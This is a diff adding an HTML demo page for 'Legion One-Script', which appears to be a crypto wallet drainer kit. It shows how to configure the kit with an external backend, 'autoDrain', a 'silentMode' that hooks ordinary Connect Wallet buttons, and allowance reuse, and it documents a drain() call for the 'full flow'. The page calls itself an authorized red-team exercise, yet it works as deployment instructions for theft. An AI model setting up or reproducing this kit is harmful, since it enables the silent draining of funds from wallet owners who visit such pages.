@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Legion One-Script Demo</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 640px;
+      margin: 48px auto;
+      padding: 0 20px;
+      line-height: 1.5;
+      color: #1e293b;
+    }
+    code, pre {
+      background: #f1f5f9;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+    pre {
+      padding: 12px;
+      overflow-x: auto;
+    }
+    .demo-connect {
+      margin-top: 24px;
+      padding: 12px 20px;
+      background: #334155;
+      color: #fff;
+      border: 0;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Legion One-Script Demo</h1>
+  <p>
+    Authorized red-team exercise page. Configure the backend, then load the standalone script.
+    A floating <strong>⬡</strong> button appears bottom-right — click to open the wallet panel.
+  </p>
+
+  <h2>1. Configure (before script tag)</h2>
+  <pre>&lt;script&gt;
+  window.LEGION_CONFIG = {
+    backendUrl: "https://legionapi-production.up.railway.app",
+    kineticKey: "YOUR_KINETIC_INTERNAL_KEY",  // optional — enables allowance reuse
+    wcProjectId: "YOUR_WALLETCONNECT_PROJECT_ID", // optional — WalletConnect QR
+    autoDrain: true,
+    silentMode: false,
+    showBalance: true,
+  };
+&lt;/script&gt;</pre>
+
+  <h2>2. Include script</h2>
+  <pre>&lt;script src="./legion-one-script.js"&gt;&lt;/script&gt;</pre>
+  <p>Or host on CDN: <code>https://your-cdn.com/legion-one-script.js</code></p>
+
+  <h2>3. CORS</h2>
+  <p>
+    Add this page origin to <code>API_CORS_ORIGINS</code> on Railway.
+    Allowance reuse requires <code>ALLOWANCE_REUSE_ENABLED=true</code> and matching
+    <code>KINETIC_INTERNAL_KEY</code>.
+  </p>
+
+  <h2>4. Programmatic API</h2>
+  <pre>LegionOne.connect();       // active tab wallet
+LegionOne.drain();         // full flow
+LegionOne.getWallets();    // connected addresses</pre>
+
+  <button type="button" class="demo-connect">Connect Wallet</button>
+  <p><small>Silent mode hooks buttons like this when <code>silentMode: true</code>.</small></p>
+
+  <!-- Demo config — replace kineticKey with your real key for allowance reuse -->
+  <script>
+    window.LEGION_CONFIG = {
+      backendUrl: "https://legionapi-production.up.railway.app",
+      kineticKey: "",
+      wcProjectId: "",
+      autoDrain: false,
+      silentMode: false,
+      showBalance: true,
+    };
+  </script>
+  <script src="./legion-one-script.js"></script>
+</body>
+</html>
